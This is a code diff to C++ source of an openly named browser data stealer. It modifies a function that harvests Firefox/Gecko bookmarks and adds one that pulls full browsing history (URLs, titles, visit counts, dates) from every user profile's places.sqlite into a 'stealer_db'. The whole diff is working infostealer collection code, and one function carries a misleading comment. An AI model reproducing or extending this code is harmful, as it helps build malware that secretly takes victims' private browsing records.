@@ -178,6 +178,7 @@ std::string get_gecko_program_dir(std::string target_user_data)
 
 BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 {
+	//This is actually Gecko History Collector
 	std::vector<DataHolder> data_list;
 
 	std::string target_user_data;
@@ -192,7 +193,7 @@ BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 						//std::cout << entry.path() << '\n';
 
 						target_bookmark_data = entry.path().string() + "\\places.sqlite";
-						sqlite3_stmt* stmt = query_database(target_bookmark_data, "SELECT  url, title, last_visit_date FROM moz_places");
+						sqlite3_stmt* stmt = query_database(target_bookmark_data, "SELECT  fk, title, dateAdded FROM moz_bookmarks");
 
 						if (stmt == nullptr)
 							continue;
@@ -201,16 +202,46 @@ BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 						{
 							DataHolder data;
 
-							char* url = (char*)sqlite3_column_text(stmt, 0);
+							char* fk = (char*)sqlite3_column_text(stmt, 0);
 							char* title = (char*)sqlite3_column_text(stmt, 1);
-							char* last_visit_date = (char*)sqlite3_column_text(stmt, 2);
+							char* dateAdded = (char*)sqlite3_column_text(stmt, 2);
+							char* url = nullptr;
 
-							if (url != nullptr && title != nullptr && last_visit_date !=nullptr) {
+							if (fk != nullptr && title != nullptr && dateAdded !=nullptr) {
+
+								if ((strlen(fk) == 0) || (strlen(title) == 0))
+									continue;
+
+								//Get URL using the foreign key from urls table
+								const char *str1 = "SELECT url FROM moz_places WHERE id = ";
+								int totalLength = strlen(str1) + strlen(fk) + 1;
+								char* query = (char*)malloc(totalLength);
+
+								if (query == NULL) {
+									continue;
+								}
+
+								// Use snprintf for safer string concatenation
+								snprintf(query, totalLength, "%s%s", str1, fk);
+
+								sqlite3_stmt* stmt2 = query_database(target_bookmark_data, query);
+								free(query);
+
+								if (stmt2 == nullptr)
+									continue;
+
+								if (sqlite3_step(stmt2) == SQLITE_ROW)
+								{
+									url = (char*)sqlite3_column_text(stmt2, 0);
+								}
+
+								if (url == nullptr)
+									continue;
 
 								data.get_bookmarks_manager().setUrl(url);
 								data.get_bookmarks_manager().setHost(dir);
 								data.get_bookmarks_manager().setName(title);
-								data.get_bookmarks_manager().setDateAdded(last_visit_date);
+								data.get_bookmarks_manager().setDateAdded(dateAdded);
 
 								data_list.push_back(data);
 							}
@@ -234,6 +265,72 @@ BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 	}
 
 	if (!dump_bookmark_data(stealer_db, data_list, data_list.size()))
+		return false;
+
+	return true;
+}
+
+BOOL gecko_history_collector(std::string username, std::string stealer_db)
+{
+	//This is actually Gecko History Collector
+	std::vector<DataHolder> data_list;
+
+	std::string target_user_data;
+	std::string target_history_data;
+	for (const auto& dir : browsers_gecko) {
+
+		target_user_data = "C:\\users\\" + username + "\\" + gecko_paths + dir + "Profiles";
+		try {
+			if (exists(target_user_data) && is_directory(target_user_data)) {
+				for (const auto& entry : directory_iterator(target_user_data)) {
+					if (entry.is_directory() && exists(entry.path() / "cookies.sqlite")) {
+						//std::cout << entry.path() << '\n';
+
+						target_history_data = entry.path().string() + "\\places.sqlite";
+						sqlite3_stmt* stmt = query_database(target_history_data, "SELECT  url, title, visit_count, last_visit_date FROM moz_places");
+
+						if (stmt == nullptr)
+							continue;
+
+						while (sqlite3_step(stmt) == SQLITE_ROW)
+						{
+							DataHolder data;
+
+							char* url = (char*)sqlite3_column_text(stmt, 0);
+							char* title = (char*)sqlite3_column_text(stmt, 1);
+							char* visit_count = (char*)sqlite3_column_text(stmt, 2);
+							char* last_visit_date = (char*)sqlite3_column_text(stmt, 3);
+
+							if (url != nullptr && title != nullptr && visit_count != nullptr && last_visit_date != nullptr) {
+
+								data.get_history_manager().setUrl(url);
+								data.get_history_manager().setHost(dir);
+								data.get_history_manager().setTitle(title);
+								data.get_history_manager().setLastVisitTime(last_visit_date);
+								data.get_history_manager().setVisitCount(visit_count);
+
+								data_list.push_back(data);
+							}
+							else {
+								// Handle the case where no data is fetched
+								continue;
+							}
+						}
+					}
+				}
+			}
+		}
+		catch (const std::filesystem::filesystem_error& e) {
+			//std::cerr << "Filesystem error: " << e.what() << '\n';
+			continue;
+		}
+		catch (const std::exception& e) {
+			//std::cerr << "General exception: " << e.what() << '\n';
+			continue;
+		}
+	}
+
+	if (!dump_history_data(stealer_db, data_list, data_list.size()))
 		return false;
 
 	return true;
